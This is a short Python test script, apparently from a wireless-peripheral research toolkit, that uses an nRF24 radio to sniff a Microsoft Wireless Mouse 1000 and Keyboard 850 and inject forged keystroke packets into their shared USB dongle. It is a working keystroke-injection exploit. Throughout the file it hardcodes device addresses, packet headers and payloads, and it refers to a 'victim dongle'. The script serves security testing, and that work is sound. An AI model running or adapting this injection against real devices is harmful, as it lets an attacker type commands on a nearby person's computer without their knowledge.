"""
Testing keystroke injection using a Microsoft mouse/keyboard set consisting of Microsoft Wireless Mouse 1000 and Microsoft Wireless Keyboard 850.
They are both paired to the same Microsoft USB dongle model 1461.
"""

import sys
from os.path import dirname

sys.path.append(dirname(dirname(__file__)))
from radio_agent import nrf24
from utils.general_utils import *
from utils.vendors import microsoft

def main():
    # initialize the radio
    radio = nrf24.nrf24()

    mouse_address = address_str_to_bytes("AA:11:5F:6E:6D")
    keyboard_address = address_str_to_bytes("AA:11:5F:6E:CD")

    # testing mouse
    radio.enter_sniffer_mode(mouse_address)
    channel = find_frequency_channel(radio)
    if not channel:
        print("Failed to find frequency channel. Try to get closer to the victim dongle.")
        sys.exit(1)

    # mouse packets are 19 bytes long. 08:90:02:F0 is the recurring 4-byte packet header obtained by sniffing the mouse (see microsoft.py)
    radio.transmit_payload(microsoft.with_checksum(payload_str_to_bytes("08:90:02:F0:A0:4D:43:00:00:04:00:00:00:00:00:00:00:00"))) # 'a' keystroke
    radio.transmit_payload(microsoft.with_checksum(payload_str_to_bytes("08:90:02:F0:A1:4D:43:00:00:05:00:00:00:00:00:00:00:00"))) # 'b' keystroke
    radio.transmit_payload(microsoft.with_checksum(payload_str_to_bytes("08:90:02:F0:A2:4D:43:02:00:04:00:00:00:00:00:00:00:00"))) # 'A' keystroke


    # testing keyboard
    radio.enter_sniffer_mode(keyboard_address)
    channel = find_frequency_channel(radio)
    if not channel:
        print("Failed to find frequency channel. Try to get closer to the victim dongle.")
        sys.exit(1)

    # keyboard packets are 20 bytes long. 09:98:06:F0 is the recurring 4-byte packet header obtained by sniffing the keyboard, but the attack only worked when setting the first byte to 0x08 (mouse device type)
    radio.transmit_payload(microsoft.with_checksum(payload_str_to_bytes("08:98:06:F0:A0:4D:43:00:00:04:00:00:00:00:00:00:00:00:00"))) # 'a' keystroke

if __name__ == "__main__":
    main()
